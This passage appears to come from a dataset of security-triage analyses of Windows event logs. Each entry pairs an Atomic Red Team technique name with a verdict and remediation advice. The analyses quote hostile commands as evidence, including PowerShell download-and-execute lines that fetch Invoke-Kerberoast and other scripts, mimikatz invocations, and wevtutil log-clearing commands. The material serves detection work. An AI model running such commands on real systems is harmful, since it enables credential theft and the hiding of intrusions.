3. **Conduct a Thorough Investigation:**
   - Deploy endpoint detection and response tools to gather more exhaustive data.
   - Review other systems for similar indicators to ascertain the extent of the breach.
4. **Remediate and Harden:**
   - After analyzing, remediate the system to close exploited vulnerabilities.
   - Implement stronger monitoring and alerting mechanisms to catch similar activities in the future.
5. **Engage with Incident Response:**
   - Collaborate with your incident response team to ensure comprehensive threat mitigation and system recovery.

In conclusion, the logs exhibit clear signs of potentially harmful actions, justified by the purposeful clearing of event logs, suspicious command executions, and unusual privilege acquisitions. Immediate action is recommended to mitigate any further risk."
CertUtil ExportPFX,"Based on the detailed analysis of the provided logs, several suspicious activities indicate potential malicious behavior:

1. **Event Log Clearing:** 
   - There are log events indicating that the Security, System, and PowerShell logs were cleared (EventID 1102 and 104). This is highly suspicious because attackers often clear event logs to cover their tracks after malicious activities or privilege escalations.

2. **Sysmon Logs Indicate Use of Wevtutil.exe for Clearing Logs:**
   - Wevtutil.exe is seen being executed multiple times, with command lines to clear event logs such as `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`. 
   - The use of wevtutil for clearing logs, especially by a non-system account, suggests malicious intent.

3. **PowerShell Command Execution:**
   - A PowerShell script is executed with a command line that downloads and executes a script from an external URL (`IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)`).
   - This command includes the use of `certutil.exe` to export a certificate, which is frequently used in malicious operations.

4. **Potential Time Tampering:**
   - The system time was altered backward (EventID 4616 and corresponding system logs), which sometimes is used by attackers to evade certain time-based security detection measures or logs integrity.
   
5. **Use of High Privilege Account:**
   - The account `admin_test` is seen performing activities requiring high privileges, including clearing event logs and possibly executing scripts. This indicates possible misuse or compromise of this account.

### Assessment
Based on the identified suspicious activities:
- The deletion of security logs and the use of wevtutil for log clearing activities, combined with the execution of a potentially malicious PowerShell script, suggests a high likelihood of malicious activities.
- There is a presence of activities that are commonly related to attacker techniques to cover tracks and execute unauthorized commands.

### Resolution: MALICIOUS

### Recommendations:
1. **Immediate Action:**
   - Isolate the host `Server002` to prevent any further potential lateral movement or data exfiltration.
   - Change credentials for the `admin_test` account immediately and investigate to determine if it has been compromised.

2. **Incident Response:**
   - Conduct a full forensic investigation to determine the extent of the compromise and identify any other affected systems.
   - Review access logs, particularly looking for unusual logins or anomalies around the time of the detected malicious activities.

3. **Strengthen Monitoring:**
   - Implement stricter PowerShell execution policies and enhance security monitoring to quickly detect unauthorized script executions.
   - Regularly audit event logs, and employ advanced monitoring solutions to flag suspicious modifications or clearings of event logs. 

These steps will help mitigate the identified threat and strengthen the security posture moving forward."
Create Volume Shadow Copy with WMI,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Observations:
1. **Cmd and reg Usage**:
   - Multiple instances of `cmd.exe` are observed executing commands involving `reg query` and `findstr`. These commands are used to query registry settings related to the product type.
   - The commands are executed by an account named `admin_test` with high integrity levels, which implies administrative privileges.

2. **Event Log Clearing**:
   - There are entries indicating event log clearing operations:
     - `EventID 1102` in Security Log: The security log was cleared by `admin_test`.
     - `EventID 104` in System Log: The system and Windows PowerShell channels’ logs were cleared by `admin_test`.
   - These actions are significant as they can be used to cover tracks, often associated with malicious activities.

3. **Process Creation and Parent-Child Relationship**:
   - The chain of command executions from `cmd.exe` leading to `reg.exe` and `findstr.exe` indicates scripted automated queries.
   - There is an entry for `wevtutil.exe` used to clear event logs, which again suggests potential malicious activity aimed at obfuscation.

4. **Volume Shadow Copy Events**:
   - Commands related to `wmic` and `shadowcopy` creation are observed. Creating volume shadow copies through command-line tools can be legitimate but is often abused by ransomware or malware for backup and rollback evasion.

5. **Time Discrepancies**:
   - There are `kernel-general` events indicating time adjustments which might be legitimate but could also imply tampering.

6. **VSS (Volume Shadow Copy) and VSSVC.exe**:
   - The execution of services like `VSSVC.exe` could be part of legitimate Windows operations, like backup, but the context here alongside log clearing is suspicious.

7. **Security and System Logs**:
   - Several security audit events (privileged account management, logon/logoff) corresponded with actions by `SERVER002$`, indicating system-level processes involving service hosts and potentially abusive administrative actions.

### Risk Assessment:
- **Clearing Logs**: The events of log clearing by a potentially compromised account (admin_test) is highly concerning. This behavior is typical of attempts to hide illicit activities.
- **Registry Queries and Volume Shadow Copies**: These actions, in isolation, can be part of administrative tasks, but in conjunction with log clearing and use of wmic make them suspicious.
  
### Conclusion:
Based on the nature of actions observed, especially event log clearing paired with querying critical registry configurations and shadowcopy actions, there are signs of potential compromise or at least suspicious activity.

### Resolution: SUSPICIOUS
The logs contain activity that doesn't look right and needs more investigation.

### Recommended Actions:
1. **Immediate Review and Monitoring**:
   - Investigate the `admin_test` user activities and whether they align with legitimate administrative duties.
   - Monitor further actions from accounts with elevated privileges to identify any unauthorized operations.
   
2. **Forensic Analysis**:
   - Acquire and preserve system images for a detailed forensic investigation.
   - Look for other signs of compromise, such as unauthorized access or changes and lateral movement across the network.

3. **Security Measures**:
   - Strengthen logging policies to prevent unauthorized log deletion.
   - Adjust alerting mechanisms to flag suspicious user behavior, especially those involving sensitive administrative tasks.

4. **Review and Adjust Access Rights**:
   - Reassess access rights granted to `admin_test` and other similar accounts to ensure only necessary privileges are provided aligned with the principle of least privilege. 

These steps will help uncover any malicious intent or unauthorized actions and bolster future defenses against similar activities."
BrowserStealer (Chrome - Firefox - Microsoft Edge),"Upon close inspection of the provided logs, several observations stand out as indicative of potential malicious activity:

1. **Schedule of Events**:
   - Multiple instances of `wevtutil.exe` being executed with the command-line argument `cl` pointing to different logs like Sysmon/Operational, Application, System, and Windows PowerShell. This command line is commonly used to clear log files. This can be a strong indicator of log clearing to obfuscate traces of malicious activity.
   - Following suspicious activity, the Security Event ID 1102 (""The audit log was cleared"") was triggered, indicating that the security logs were indeed cleared. This event was conducted by user `SERVER002\\admin_test`.
   
2. **Use of PowerShell**:
   - PowerShell was used to execute complex commands targeting the file system navigation, item copying, and removal from a Firefox profile. The use of `PowerShell` to interact with such files (e.g., `key4.db` and `logins.json`), which are typically associated with sensitive information like stored passwords, is suspicious. The command further indicates interaction with `AtomicRedTeam`, which is a known security test suite and could potentially be misused for malicious activities like credential dumping.
   - The command contains redirections to `null`, which is a typical method to hide errors and outputs, indicating potential obfuscation attempts.

3. **Other Observations**:
   - Execution of `whoami.exe` and `hostname.exe`, although normal tools, when used in a sequence of unexpected commands, can indicate enumeration attempts which are common in the reconnaissance phase of attacks.
   - The processes `svchost.exe` and `msiexec.exe` appear to be running under `NT AUTHORITY\SYSTEM` which in isolation is not alarming, but could be abused for malicious purposes given the above suspicious activities.

### Conclusion:
Given these observations, the activity within the logs indicates strong signs of malicious behavior. The repeated log clearing events, along with the suspicious use of PowerShell scripts for credential dumping and potential enumeration suggest efforts to compromise the system and obfuscate operations.

**Resolution: MALICIOUS**
- **Guidance**: Immediate incident response actions should be taken to isolate and investigate Server002. All credentials used on this system should be considered compromised and need to be reset. It is crucial to conduct a full forensic analysis and data recovery, if possible, to identify the extent of the breach and potentially recover lost logs for further investigation. Implement tighter log monitoring and review access rights to ensure similar actions are flagged and investigated promptly in the future."
Offline Credential Theft With Mimikatz,"**Detailed Analysis of Logs:**

- **System Log**:
  1. The events 104 represent the clearing of event logs (System and Windows PowerShell) by a user named ""admin_test"". Clearing logs can be suspicious, especially if done frequently or without a valid maintenance reason, as it can be an attempt to cover up malicious activity.

- **Security Log**:
  1. The event ID 1102 in the Security log indicates that the security log was also cleared by ""admin_test"". Similar to the System log, this behavior might be suspicious as attackers often clear logs to erase traces of their actions.

- **Sysmon Log**:
  1. Events show the use of `cmd.exe` with a command line attempting to check for a dump file related to `lsass`. This process, particularly interacted with `lsass`, can be suggestive of credential dumping attempts or reconnaissance activities.
  2. Repeated use of `wevtutil.exe` for clearing logs (`cl` command) of multiple channels (Sysmon/Operational, Application, Security, and Windows PowerShell). This sequential log clearing aligns with attempts to hide actions.
  3. Execution of administrative commands like `hostname.exe` and `whoami.exe`. While not inherently malicious, their context in log clearing and process hierarchy can infer a reconnaissance phase of an attack.
  
- **Anomalous Behavior Noticed**:
  - System and Security logs cleared by the same user, closely followed by a PowerShell log clearance.
  - Execution of potentially suspicious commands such as the one to interact with `lsass` and the consistent use of `wevtutil.exe` for log clearing.
  - All activities are executed under the user ""admin_test"", pointing to potential compromise of this account.

**Assessment**:
The logs present a picture of potentially malicious activity. The repetitive and systematic clearing of event logs, combined with the high-integrity level of the processes executed by a singular user, indicates behaviors typically associated with covert malicious operations.

**Resolution**: MALICIOUS - The events contain activities indicative of attempted log tampering and possible credential access attempts. These actions align with techniques used in system compromises, such as log cleaning and use of tools mimicking reconnaissance.

**Guidance on How to Proceed**:
- Immediately begin a deeper investigation into the user account ""admin_test"" for unauthorized access or misuse.
- Check the system for any dumped credentials or suspicious software/tools installed, particularly in the directory paths indicated in the logs.
- Isolate the involved host ""Server002"" if possible to prevent further spread or damage.
- Reinforce log monitoring and audit policies, and ensure alerts are configured for any log clearing activities.
- Engage the incident response team to analyze potential lateral movement or data exfiltration tactics."
Request for service tickets,"Upon thorough analysis of the provided logs, several anomalies have been identified that may indicate malicious activity. Here are the specific details of the findings:

1. **Log File Clearing (Event ID 1102 and 104):**
   - The security log on the system was cleared by the user `admin_test` on `Server002`. The event ID 1102 is typically associated with the clearing of event logs, which can be an activity associated with malicious actions to cover tracks after an intrusion.
   - The system and Windows PowerShell logs were also cleared as indicated by Event ID 104, again performed by the user `admin_test`. This is suggestive of an attempt to hide activity.

2. **Suspicious PowerShell Activity (Sysmon Event ID 1 and PowerShell Log Event ID 600):**
   - Multiple instances of PowerShell execution are captured in the logs, especially with the command line showing:
     ```
     powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing), Invoke-Kerberoast | fl}
     ```
   - This particular command is concerning as it suggests usage of a script from the Empire framework (a known post-exploitation tool) for performing Kerberoasting attacks, which is a common technique used to extract service account credentials from Active Directory.

3. **Unusual Command Execution (Sysmon Event ID 1):**
   - Execution of commands like `wevtutil` to clear logs (Sysmon captures multiple instances) is suspicious.
   - The presence of `hostname.exe` and `whoami.exe` executions could imply reconnaissance activities.

4. **Process Execution with High Integrity Level:**
   - The Sysmon logs frequently show processes executing with high integrity, including PowerShell, indicating that they are running with elevated privileges. This could suggest an unauthorized elevation of privileges.

### Assessment:

In summary, there are clear indicators of potentially malicious behavior due to the following:
- The clearing of logs by the user `admin_test` across multiple log channels.
- The use of PowerShell to download and execute a script from a known offensive security toolkit.
- Command-line activity and log-clearing behavior typical of an attacker trying to obfuscate actions on a compromised system.

### Resolution:

**Resolution: MALICIOUS**

Given the combination of suspicious behaviors, it's quite evident that these activities are malicious. Immediate remediation steps are recommended, including but not limited to:
- Investigate the user `admin_test`'s activities, potentially disable the account until further analysis.
- Review system integrity and perform a full security audit to assess any further compromises.
- Harden security controls and monitor closely for further anomalous behaviors.
- Ensure that all systems are properly updated and patched to reduce vulnerabilities.

Immediate containment, eradication of threats, and recovery plans should be initiated along with legal consultation if needed for further investigation."
Golden SAML,"Upon detailed analysis of the provided logs, several indicators suggest potential malicious behavior, primarily pointing towards an unauthorized attempt to perform credential theft using a technique known as ""Golden SAML"" attacks. Here’s a breakdown of the suspicious activities conducted on the Windows host, ""Server002"":

1. **Log Clearing Activities**:
   - The security logs record an event (EventID: 1102) indicative of the Security log being cleared by the user ""admin_test"". This activity is a typical sign of a potential attacker trying to cover their tracks, which is inherently suspicious, especially if not tied to routine maintenance activities.
   - The System log also shows log clearing events (EventID: 104) for the System and Windows PowerShell channels, further indicating an attempt to hide activities.

2. **PowerShell Activity**:
   - The Windows PowerShell logs show a script execution involving the import of the ""AADInternals"" module. The script generates a new SAML token (`New-AADIntSAMLToken`) and attempts to obtain an access token for Azure Active Directory Graph using this SAML token. This specific behavior is indicative of a ""Golden SAML"" attack, allowing unauthorized access to Microsoft cloud services by forging authentication tokens.
   - Such PowerShell commands are abnormal for typical administrative tasks and suggest a sophisticated attack attempting to pivot within a network.

3. **Repeated Use of `wevtutil.exe`**:
   - The Sysmon logs indicate multiple executions of the `wevtutil.exe` utility, used for clearing Event logs. Posts about `wevtutil.exe` clearing specific channels such as Sysmon/Operational (Sysmon EventIDs 18009-18043), suggest attempts to obscure auditing trails.

4. **Host and User Reconnaissance**:
   - Both `HOSTNAME.EXE` and `whoami.exe` utilities were run in succession, typically linked with reconnaissance activities to ascertain machine details and assess current logged user context after potentially elevating privileges or when operating under new authentication contexts.
   
5. **Suspicious Process Execution Chains**:
   - Many processes (especially those related to logging: `wevtutil.exe`) are executed in short succession, suggesting automated or scripted activities. Such behavior, when coupled with PowerShell scripts aiming to manipulate authentication infrastructures, significantly indicates malicious intent.

Overall, the observed pattern involves attempts to manipulate identity settings illicitly, covering tracks by clearing crucial logs, and performing local reconnaissance. Considering the use of known attack utilities and techniques, the nature of the activities, and the types of PowerShell commands executed:

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- **Isolate and Investigate**: Immediately isolate ""Server002"" from the network to prevent potential spread and further data compromise.
- **Audit and Analyze**: Conduct a full memory and disk analysis to determine the full scope of the compromise, particularly focusing on access to sensitive services and data.
- **Credential Security**: Promptly reset or revoke the credentials of any potentially affected accounts (`admin_test`), and scrutinize audit logs across other connected systems for unusual behaviors.
- **Review and Recover**: Ensure to review Active Directory activities and mitigate any backdoors or unauthorized modifications.
- **Log Monitoring**: Implement rigorous monitoring and logging across all systems for unusual or unauthorized activity, tailoring specific alerts for PowerShell executions and log-clearing activities.
- **Enhanced Security Protocols**: Review and strengthen PowerShell and remote access policies and consider deploying more robust network segmentation and two-factor authentication (2FA) systems."
Password Spray (DomainPasswordSpray),"After thoroughly analyzing the provided Windows event logs, several critical observations can be made. 

### Summary of Findings:

**1. Malicious PowerShell Activity:**
   - In the Windows PowerShell event logs, numerous entries show the execution of scripts downloaded from an external source (`raw.githubusercontent.com`). The script in question is `DomainPasswordSpray.ps1`, associated with performing a password spray attack targeting domain accounts (`Invoke-DomainPasswordSpray -Password Spring2017`).
   - This activity is indicative of malicious intent, as password spraying is a common brute-force attack technique against network accounts.

**2. Log File Clearing:**
   - In both the security and system logs, entries denote the clearing of event logs by the user `admin_test`, identified by the `wevtutil.exe` command.
   - This is a suspicious indication that someone may be attempting to cover tracks after conducting potentially malicious activity.

**3. Privileged Account Usage:**
   - Multiple entries in the security logs show the account `admin_test` being granted high-level privileges, such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are potent for malicious use, allowing extensive control over system processes and ownership.

**4. Time Change Event:**
   - There is a series of time change events (`EventID 4616`) recorded around the same time as other suspicious activities. This could point to a tactic used to confuse log timelines and hide activities by mismatching log entry times.

### Assessment:

Considering the discovered indicators, the activity is highly suggestive of malicious behavior aiming to compromise system security and hide traces. A detailed inspection of the affected systems should be conducted to identify the extent of the breach and any potential compromise of sensitive accounts or data attributed to these actions.

### Resolution: MALICIOUS

### Recommended Action Steps:

1. **Immediate Containment:**
   - Isolate the affected host `Server002` from the network to prevent further lateral movement or data exfiltration.

2. **Investigate User Account Activity:**
   - Investigate `admin_test` and any related accounts for unauthorized use, especially around the time of these events, and review for potential compromise on other systems.

3. **Review and Restore Logs:**
   - Attempt to recover cleared logs through backups or other means to understand any additional malicious actions executed outside the captured logs.

4. **Conduct a Forensic Investigation:**
   - Perform a detailed forensic analysis of the system to identify additional malware or persistence mechanisms that may have been employed by the attacker.

5. **Reset Credentials and Enhance Security:**
   - Reset passwords for all privileged accounts and implement additional security controls such as multifactor authentication and enhanced monitoring on privileged activities.

6. **Patch and Update Systems:**
   - Ensure all systems have the latest patches applied to prevent exploitation through known vulnerabilities.

By taking these recommended actions, you can effectively address the breach and strengthen the overall security posture of the environment."
Rubeus kerberoast,"Upon analyzing the provided Windows event logs, here is the detailed breakdown of suspicious and potentially malicious behaviors observed:

### Application Log:
- The logs display repeated entries indicating that Windows Defender security product is active, which is generally benign and expected behavior for maintaining system security. These entries do not indicate any malicious activity.

### PowerShell Log:
- Multiple events correlate with the execution of a PowerShell script containing actions such as `klist purge` and executing `rubeus.exe` with the `kerberoast` command through the use of cmd.exe. This indicates an attempt at Kerberos ticket harvesting, a known technique used to extract hash information for potential lateral movement or privilege escalation in a Windows environment, which is suspicious behavior.

### Security Log:
- The critical event here is EventID 1102, which indicates that the security log was cleared by a user `admin_test`. Log clearance is a common tactic used by attackers to cover their tracks after compromise, making it a highly suspicious act warranting further investigation.

### System Log:
- Similarly to the security logs, the system log also displays evidence of log clearance by the same user. This further supports the suspicious activity noted above.

### Sysmon Log:
- Several entries show `wevtutil.exe` being used to clear logs from channels like Microsoft-Windows-Sysmon/Operational, Application, System, and Security, which matches the activity of clearing logs noted in other logs. The user associated with these actions, `SERVER002\admin_test`, should be investigated further as it is linked to the system integrity level and execution using high privileges.
  
- Additionally, the execution of `rubeus.exe` for Kerberos ticket extraction through a PowerShell command being logged multiple times, cross-referenced with other log actions, strengthens the indication of suspicious activities aimed at compromising the system's credentials and log integrity.

### Overall Assessment:
The combination of PowerShell commands for `kerberoast` alongside the clearing of various logs (Application, System, Security, and PowerShell) suggests an attempt at covering tracks after a potential exploit or information-gathering activity. The execution of known penetration testing tools like Rubeus in this context further solidifies the presence of potential malicious activity.

### Resolution: MALICIOUS
The evidence points strongly toward a compromise involving credential harvesting and obfuscation tactics. The clearing of logs, coupled with the execution of credential theft utilities, indicates a malicious intent. Immediate steps should involve:
1. Isolating the affected host (`Server002`) from the network.
2. Conducting a thorough investigation and forensic analysis to identify the full extent of the compromise.
3. Reviewing and reinforcing access controls and logging policies.
4. Resetting credentials that may have been compromised.
5. Monitoring for any other signs of similar activities network-wide.

Given this analysis, the activities within the logs are classified as MALICIOUS and necessitate urgent response actions and a comprehensive review of surrounding activities to prevent further compromise."
Extract Windows Credential Manager via VBA,"Based on the investigation of the provided Windows event logs, several key elements stand out that indicate potential malicious activity:

1. **Event Log Clearing**: 
   - An event with Event ID 1102 in the Security log and Event ID 104 in the System log indicate that the event logs were cleared on Server002 by the user ""admin_test"". This is a common tactic used by malicious actors to cover their tracks after suspicious activity.

2. **Time Change Events**: 
   - Events indicating system time changes (Event ID 4616 in the Security log and Event ID 1 in the System log) were noted. Altering system time could be a tactic to synchronize with an attack or to confuse timestamp-based analysis.

3. **Suspicious PowerShell Activity**:
   - The Windows PowerShell log contains executed commands that reference a known repository for penetration testing (`atomic-red-team`) indicating the potential download and execution of a malicious script (`Invoke-MalDoc.ps1`). This script is often used in malware distribution scenarios, making this activity highly suspicious.

4. **Command-Line and Process Execution**:
   - Multiple entries in the Sysmon log show executions of `wevtutil.exe` with the command line clearing logs, which correlate with the observed log clearing events.
   - Additionally, PowerShell and related console hosts (`conhost.exe`) executed with specific command lines support the narrative of unusual or potentially malicious scripting activity.

Given these findings, the logs provide multiple signs of potential compromise indicating suspicious behavior:

- The log clearing activities align with an attempt to hide other suspicious actions.
- The execution of potentially malicious PowerShell scripts (retrieved from external sources) suggests possible malicious exploitation.

### Resolution:
**MALICIOUS** - The logs contain confirmed malicious activities, specifically log manipulation and execution of potentially harmful scripts that strongly indicate compromise.

### Guidance on How to Proceed:
- **Immediate Containment**: Restrict network access to the affected host (Server002) to prevent further spread or exfiltration of data.
- **Forensic Analysis**: Conduct a thorough forensic analysis on Server002 to determine the full scope of compromise and identify any malicious payloads or persistence mechanisms.
- **User Account Review**: Check the account ""admin_test"" for any unauthorized usage and reset its credentials as a precaution.
- **System Restoration and Hardening**: Once the system has been analyzed and threats neutralized, restore Server002 to a known good state and apply additional security hardening measures.
- **Monitor and Educate**: Increase monitoring for similar activities and educate users about the risks of downloading and executing unverified scripts."
Dump LSASS.exe using imported Microsoft DLLs,"Upon reviewing the provided Windows event logs, several points of interest and potentially suspicious activities emerge. Here's a breakdown of the analysis:

### System Log Analysis

- **Log Clearance**: Multiple log files, including System, Security, and Windows PowerShell logs, were cleared by the user `admin_test`. This is evident from repeated Event ID 104 and Event ID 1102 entries. The clearing of logs, especially security and PowerShell logs, may indicate an attempt to cover up actions and is considered suspicious behavior. 

### Security Log Analysis

- The Security logs being cleared (Event ID 1102) corroborate the action of potential malicious intent, as such actions are typically indicative of someone trying to hide their tracks.

### Sysmon Log Analysis

- **Execution of `wevtutil.exe`**: The command-line tool `wevtutil.exe` was used multiple times (as seen in Event IDs corresponding with Process ID 6024, 3524, 4080) to clear event logs for different channels, explicitly stating 'cl' which refers to clear logs. This kind of activity indicates an intentional attempt to erase evidence or logs from the system.

- **PowerShell Invocation with Suspicious Command**: A PowerShell script was executed with a command aimed to invoke `xordump.exe` targeting `lsass` process to dump memory. This is concerning as `lsass` process holds sensitive data such as credentials and memory dumps of it are often associated with malicious activities such as credential harvesting. This action alone points directly towards potentially malicious activities (Event ID 1 with Process ID 5364 and associated PowerShell logs).

### Windows PowerShell Log Analysis

- **Suspicious PowerShell Commands**: The logs confirm that a PowerShell session was initiated to execute `xordump.exe`, a script designed to create a dump of `lsass.exe` into a `.dmp` file. Such activities are indicative of attempts to extract sensitive data and potentially escalate privileges or move laterally in the network.

### Final Assessment

The combination of log clearing across multiple channels and the execution of a script to dump the `lsass` process clearly suggests malicious intentions. Therefore, based on this analysis:

- **Resolution**: **MALICIOUS**

### Recommendations for Next Steps

1. **Immediate Containment and Investigation**: Isolate the affected system (Server002) from the network to prevent further potential compromise or data exfiltration.
   
2. **Incident Response**: Launch a full investigation into the entities associated with user `admin_test` and any sanctioned use of `xordump.exe` on the network.

3. **Credential Audit and Reset**: Audit and reset credentials associated with the `admin_test` user immediately and track any additional anomalies in the credential usage.

4. **Review of Security Policies and Tools**: Examine the effectiveness of security monitoring tools and adapt detection rules to flag similar future actions more effectively.

5. **System and Network Forensics**: Run a comprehensive forensic analysis of Server002 for any additional backdoors or persistence mechanisms employed by the attacker.

6. **Awareness and Training**: Reinforce threat awareness training for users and administrators on identifying social engineering and spear-phishing attempts that might lead to initial compromises."
Brute Force Credentials of single Azure AD user,"Upon reviewing the provided Windows event logs, a detailed analysis reveals several points of concern:

1. **Wevtutil Execution and Log Clearance**:
   - Multiple instances of `wevtutil.exe` being executed with the `cl` (clear) command are noted. This action is used to clear event logs. Specifically, it was used to clear the Application, System, Windows PowerShell, and Security logs.
   - Log clearance is a common tactic employed by malicious actors to cover their tracks and erase forensic evidence post-compromise. The clearing of logs, especially security logs, without documentation or a valid reason, can be considered suspicious.

2. **Suspicious PowerShell Activity**:
   - A PowerShell script execution was detected with a script attempting to brute-force an Azure AD account `bruce.wayne@contoso.com` using a list of passwords. This constitutes unauthorized access attempts and is indicative of malicious activity.
   - The PowerShell log also confirms the loading of the AzureAD module and details the execution of a brute-force script against an external account.

3. **Console Host and Conhost.exe Processes**:
   - Various instances of `conhost.exe` (Console Window Host) are logged, tied to benign command-line executions such as `whoami.exe` and `hostname.exe`, but it is worth noting that the behavior of `conhost.exe` can sometimes be associated with command line utilities and could be part of an obfuscation technique.
   - However, the presence of `conhost.exe` is routine when commands are executed within command shells, and by itself, it is not necessarily suspicious unless seen executing unknown binaries or scripts.

4. **User Context**:
   - The actions described indicate processes running under the account `SERVER002\\admin_test` which implies administrative privileges were used to execute potentially malicious actions, further elevating the severity of the detected activities.

5. **Process Origin**:
   - The parent process for most of the recently executed processes is `wsmprovhost.exe`, which is typically tied to Windows Remote Management. This aligns with attempts to remotely manage or control system functionality, which in administrative contexts could be usual but should not typically involve event log clearance or brute-force scripts.

**Assessment**:
Given the execution of a script exploiting PowerShell for account brute-force attacks and the clearing of important event logs, the evidence points towards unauthorized activities consistent with malicious intent.

**Resolution**: MALICIOUS

These logs are definite indicators of a security breach that must be addressed immediately. The system shows signs of being compromised, and urgent incident response actions are required to:
- Isolate the system to prevent further unauthorized access.
- Conduct a full investigation to ascertain the scope and impact of the breach.
- Analyze and correlate additional logs and data for more context on potential lateral movement or data exfiltration.
- Review and update security policies and monitoring capacities to detect and prevent similar activities in the future."
Export Certificates with Mimikatz,"**Detailed Analysis:**

Upon careful re-examination of the provided logs from different channels on the Windows host (Server002), several observations point towards potentially malicious activity:

1. **Security Log (Event ID 1102)**:
   - An event with ID 1102 indicates that the security event log has been cleared. This was done by the user ""admin_test"". This is typically an indication of an attempt to cover tracks, since clearing logs is a common action taken by attackers after conducting illicit activities.

2. **Sysmon Logs**:
   - A sequence of events showing the execution of the `wevtutil.exe` tool with the `cl` (clear log) command against different log channels (Microsoft-Windows-Sysmon/Operational, Application, System, Security, Windows PowerShell). This is an indication of intentional log clearing, which aligns with the typical behavior of attackers attempting to cover their tracks.
   - The execution of `powershell.exe` by the same user (admin_test) right before the series of `wevtutil.exe` commands suggests potential command execution attempts that were likely malicious.
   - The process `mimikatz.exe` was executed through `cmd.exe`. Mimikatz is a known post-exploitation tool used for credential dumping and other malicious activities.

3. **System Logs**:
   - There are two Event ID 104 entries related to log file clearance for the ""System"" and ""Windows PowerShell"" channels, reinforcing the suspicious intent to wipe out logs.

**Assessment of the Situation:**

The series of log entries strongly suggest malicious actions:
- **Log Clearings**: The wevtutil command was used to clear logs in multiple channels, which is a strong indication of someone trying to hide their activities.
- **Execution of Known Malicious Tools**: The presence of Mimikatz being executed suggests that the system was targeted for credential harvesting.
- **Timing and User Consistency**: All the suspicious activities are linked to the user ""admin_test"" in rapid succession which is highly unusual for regular administrative tasks.

**Resolution: MALICIOUS**

Given the evidence of log clearance attempts, execution of known malicious tools, and the consistent user pattern involved in these operations, it is highly likely that these logs indicate a compromise involving privilege escalation and credential theft activities.

**Recommended Actions:**

1. **Immediate Isolation**: Isolate the server (Server002) from the network to prevent any further compromise or damage.
2. **Investigation and Forensics**: Perform a thorough forensic analysis to identify the extent of the compromise and trace the attacker’s actions.
3. **Credential Reset**: Reset credentials for accounts with high privileges, especially the account ""admin_test"".
4. **Security Posture Review**: Review and enhance security measures on the network and host level to prevent future incidents.
5. **Reporting and Collaboration**: Report the incident internally and, if necessary, involve external security incident response teams for additional support.

These actions should help contain the incident and mitigate further risks to the environment while ensuring that all traces of potential malicious activity are captured and analyzed."
Crafting Active Directory silver tickets with mimikatz,"After analyzing the provided event logs, there are several indicators suggesting potentially malicious activity. Here are the key points:

1. **Presence of Mimikatz**:
   - The Sysmon log shows a command-line invocation of `cmd.exe` with the `mimikatz.exe` path, which is a well-known credential dumping tool used by attackers. The command line logged is `""C:\\Windows\\system32\\cmd.exe"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe`. This is an indicator of a potential security breach.

2. **Cleared Event Logs**:
   - The security log indicates that audit logs (Event ID 1102) have been cleared: `""LogFileCleared""`. Clearing logs can be an action taken by attackers to remove traces of their activities. The action is associated with the user `admin_test`.

3. **Abuse of Wevtutil**:
   - The Sysmon log shows multiple usage of `wevtutil.exe` to clear logs, including the entries: `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational` and `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`. These actions align with attempts to cover tracks by an attacker after suspicious activity.

4. **High Integrity Level Execution**:
   - The presence of commands executed with high integrity level, such as the execution of `cmd.exe` and `wevtutil.exe`, indicates actions that require administrative privileges. This can be indicative of privilege escalation.

5. **Security Audit Privileges Observed**:
   - There were multiple events (Event ID 4672) that indicate that the SYSTEM user, with elevated privileges, was active during this timeframe. This could hint at the misuse of privileged accounts.

6. **Suspicious User Activity**:
   - The user `admin_test` is frequently associated with the suspicious activities within this timeframe, such as log clearing and execution of suspicious commands/processes.

7. **Lack of Legitimate Context for Actions**:
   - The actions such as executing `mimikatz`, persistent log cleansing, and the pattern of execution with high privileges without a legitimate context affirm the suspicion for malicious intent.

**Assessment**:
Based on the aforementioned points, the logs indicate a high likelihood of malicious activity involving potential credential theft, log evasion, and unauthorized access.

**Threats/Risks Identified**:
- Potential compromise of credentials and sensitive data (due to `mimikatz` usage).
- Erasure and tampering of security logs to impede forensic analysis.
- Unauthorized privilege escalation and administrative access.

**Guidance on How to Proceed**:
1. **Immediate Actions**:
   - Isolate the affected host from the network to prevent further access or data exfiltration.
   - Conduct a detailed forensic analysis of the host’s memory and disk to gather more evidence.
   - Change credentials for all accounts used on the compromised host.

2. **Remedial Measures**:
   - Review and tighten security protocols surrounding privileged account usage.
   - Enhance logging capabilities and ensure log retention policies can't be trivially circumvented.
   - Deploy endpoint threat detection systems to catch similar activities promptly in the future.

3. **Long-Term Strategy**:
   - Conduct a thorough security audit and gap analysis to bolster defenses against credential theft and privilege misuse.
   - Implement additional security monitoring and alerting for critical processes and services.

Credential Dumping with NPPSpy,"Based on the entries provided, the logs contain several distinct indicators of potentially malicious activity:

### Highlights from Logs:

1. **Security Log - Event ID 1102 (Log Cleared):**
   - The security log has been cleared by the user `admin_test`, which is often an attempt to cover tracks following malicious activity. This alone does not confirm malicious intent but is a red flag, especially since it was cleared without a backup.

2. **PowerShell Events:**
   - A PowerShell script executed suspicious activity with the following steps:
     - A file `NPPSPY.dll` was copied to `C:\Windows\System32\`, a protected system directory.
     - Registry keys were modified to add `NPPSpy` to the provider order, potentially indicating the installation of a malicious network provider to intercept network communications.
     - Creation and modification of registry paths to establish services under `NPPSpy`.
     - An echo command suggests capturing cleartext passwords in `C:\NPPSpy.txt`, which is indicative of credential harvesting.

3. **Sysmon Logs:**
   - Frequent use of `wevtutil.exe` to clear various event logs (`Security`, `System`, and `Windows PowerShell`), all conducted by the same `admin_test` user shows attempts to hide actions on the endpoint.
